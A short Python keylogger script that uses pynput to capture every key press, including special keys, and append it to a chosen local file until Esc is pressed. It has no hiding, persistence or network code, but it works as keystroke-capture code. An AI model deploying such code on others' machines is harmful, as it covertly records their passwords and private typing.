from pynput import keyboard
import os

file_path = "" 


def get_file_path():
    filename = input("Enter file name: ").strip()
    if not filename:
        filename = "text.txt"  
    return filename


def write_to_file(content, mode="a"):
    with open(file_path, mode) as file:
        file.write(content)


def handle_special_key(key):
    if key == keyboard.Key.space:
        write_to_file(' ')
    elif key == keyboard.Key.enter:
        write_to_file('\n')
    elif key == keyboard.Key.backspace:
        try:
            with open(file_path, "rb+") as file:
                file.seek(0, os.SEEK_END)
                pos = file.tell() - 1
                if pos >= 0:
                    file.truncate(pos)
        except Exception as e:
            print(f"Error input: {e}")
    else:
        write_to_file(f'[{key}]')


def keyPressed(key):
    print(str(key))

    if key == keyboard.Key.esc:
        print("Exiting keylogger...")
        return False

    try:
        if hasattr(key, 'char') and key.char is not None:
            write_to_file(key.char)
        else:
            handle_special_key(key)
    except Exception as e:
        print(f"Error: {e}")


if __name__ == "__main__":
    file_path = get_file_path()
    with keyboard.Listener(on_press=keyPressed) as listener:
        listener.join()
